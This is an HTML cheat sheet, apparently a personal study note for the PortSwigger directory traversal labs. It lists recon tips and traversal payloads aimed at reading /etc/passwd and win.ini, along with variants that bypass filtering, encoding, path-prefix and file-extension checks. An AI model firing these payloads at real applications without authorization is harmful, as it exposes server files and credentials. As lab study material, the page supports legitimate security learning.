<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
<head>
  <meta charset="utf-8" />
  <meta name="generator" content="pandoc" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
  <title>Directory Traversal</title>
  <link rel="stylesheet" href="/static/style.css">

</head>
<body>
<header id="title-block-header">
</header>
<h1 id="directory-traversal">Directory Traversal</h1>
<h2 id="summary">Summary</h2>
<ul>
<li><p><a href="#recon">Recon for Directory Traversal
Vulnerabilities</a></p></li>
<li><p><a href="#cheat-sheet">Portswigger Labs Cheat Sheet /
Payloads</a></p></li>
</ul>
<p><br></p>
<h2 id="resources">Resources</h2>
<ul>
<li>https://portswigger.net/web-security/file-path-traversal</li>
<li>https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include</li>
</ul>
<p><br></p>
<h2 id="recon">Recon</h2>
<h3 id="identify-directory-traversal">Identify Directory Traversal</h3>
<ul>
<li><p>Identify any application functionality that is likely to involve
retrieval of data from a server’s filesystem.</p></li>
<li><p>Look for any input fields that reference a file or directory
name, or that contain any file extensions.</p>
<ul>
<li>Example: ?file=test, ?item=test.html</li>
</ul></li>
<li><p>After identifying potential targets for directory traversal
testing, we need to test every instance individually to determine if
user controllable data is used to interact with the server filesystem in
an unsafe way.</p></li>
</ul>
<p><br></p>
<h2 id="cheat-sheet">Cheat Sheet</h2>
<p><br></p>
<h3 id="no-defenses-in-place">No Defenses in place</h3>
<ul>
<li>This is a basic payload that can be used to test for directory
traversal vulnerabilities when the application doesn’t implement any
input validation. This payload will step up 3 directories to reach the
filesystem root, then reference another common file depending on the
operating system in use.</li>
</ul>
<div class="sourceCode" id="cb1"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="ex">../../../etc/passwd</span></span></code></pre></div>
<div class="sourceCode" id="cb2"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="ex">../../../windows/win.ini</span></span></code></pre></div>
<p><br><br> <strong>Many applications that place user input in file
paths implement some defenses against traversal attacks. The following
payloads include some techniques to use in order to bypass these
defenses.</strong></p>
<p><br><br> ### Non-recursive filtering bypass</p>
<ul>
<li>The application is filtering out the ../ characters, but not in a
recursive manner:</li>
</ul>
<div class="sourceCode" id="cb3"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="ex">....//....//....//etc/passwd</span>   </span></code></pre></div>
<div class="sourceCode" id="cb4"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="ex">..././..././..././etc/passwd</span></span></code></pre></div>
<p><br></p>
<h3 id="absolute-path-bypass">Absolute path bypass</h3>
<ul>
<li>This payload references the file directly without the use of the
traversal sequences</li>
</ul>
<div class="sourceCode" id="cb5"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="ex">/etc/passwd</span>  </span></code></pre></div>
<p><br></p>
<h3 id="encoding-bypass">Encoding bypass</h3>
<ul>
<li>Double URL encode the following payload:</li>
</ul>
<div class="sourceCode" id="cb6"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="ex">../../../etc/passwd</span></span></code></pre></div>
<ul>
<li><p>Other variations of the above:</p>
<ul>
<li>Double URL encode only the / character in ../ :</li>
</ul></li>
</ul>
<div class="sourceCode" id="cb7"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="ex">..%25%32%66</span></span></code></pre></div>
<ul>
<li>URL encode the / character ..%2f , then URL encode only the %
character in ..%2f :</li>
</ul>
<div class="sourceCode" id="cb8"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="ex">..%252f</span></span></code></pre></div>
<p><br><br> <strong>Burp Pro includes a Path Traversal fuzzing wordlist
that has many variations of encoding sequences to use.</strong>
<br><br></p>
<h3 id="validation-of-starting-path-bypass">Validation of starting path
bypass</h3>
<ul>
<li>Sometimes the application requires that the supplied filename begins
with a base folder. We can include this base folder and add in the
traversal sequences after it.</li>
</ul>
<div class="sourceCode" id="cb9"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="ex">/var/www/images/../../../etc/passwd</span></span></code></pre></div>
<p><br></p>
<h3 id="file-extension-validation-bypass">File extension validation
bypass</h3>
<ul>
<li><p>If the application requires that the filename must end with a
certain file extension, we can inject a null byte to possibly terminate
the file path before the required extension:</p>
<ul>
<li>Other methods to bypass this -
https://portswigger.net/web-security/file-upload#obfuscating-file-extensions</li>
</ul></li>
</ul>
<div class="sourceCode" id="cb10"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="ex">../../../etc/passwd%00.png</span></span></code></pre></div>
<p><br><br><br></p>
<h3
id="pending-to-complete-labs-that-are-missing-from-cheat-sheet">Pending
to complete labs that are missing from cheat sheet:</h3>
<ul>
<li>All labs in this category are completed and referenced in cheat
sheet.</li>
</ul>
</body>
</html>
